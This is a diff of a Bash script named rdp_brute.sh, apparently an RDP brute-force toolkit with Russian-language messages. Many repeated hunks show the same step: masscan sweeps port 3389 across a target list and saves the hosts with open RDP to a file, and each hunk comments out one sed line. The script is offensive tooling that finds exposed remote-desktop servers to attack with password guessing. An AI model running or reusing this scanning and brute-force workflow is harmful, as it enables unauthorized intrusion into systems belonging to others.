@@ -2911,7 +2915,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2960,7 +2964,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3009,7 +3013,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3058,7 +3062,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3107,7 +3111,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3156,7 +3160,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3205,7 +3209,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3254,7 +3258,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3303,7 +3307,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3352,7 +3356,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3401,7 +3405,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3450,7 +3454,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3499,7 +3503,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3548,7 +3552,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3597,7 +3601,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3645,7 +3649,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3694,7 +3698,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3743,7 +3747,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3792,7 +3796,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3841,7 +3845,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3890,7 +3894,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3939,7 +3943,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -3988,7 +3992,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4037,7 +4041,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4086,7 +4090,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4135,7 +4139,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4184,7 +4188,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4233,7 +4237,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4282,7 +4286,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4331,7 +4335,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4380,7 +4384,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4429,7 +4433,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4477,7 +4481,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4525,7 +4529,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4574,7 +4578,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4623,7 +4627,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4672,7 +4676,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4721,7 +4725,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4770,7 +4774,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4819,7 +4823,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4868,7 +4872,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4917,7 +4921,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -4966,7 +4970,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5015,7 +5019,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5063,7 +5067,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5111,7 +5115,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5160,7 +5164,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5209,7 +5213,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5258,7 +5262,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5307,7 +5311,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5356,7 +5360,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5405,7 +5409,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5454,7 +5458,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5503,7 +5507,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5552,7 +5556,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5601,7 +5605,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5650,7 +5654,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5699,7 +5703,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5748,7 +5752,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5797,7 +5801,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5846,7 +5850,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5895,7 +5899,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5943,7 +5947,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -5992,7 +5996,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6041,7 +6045,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6090,7 +6094,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6139,7 +6143,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6188,7 +6192,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
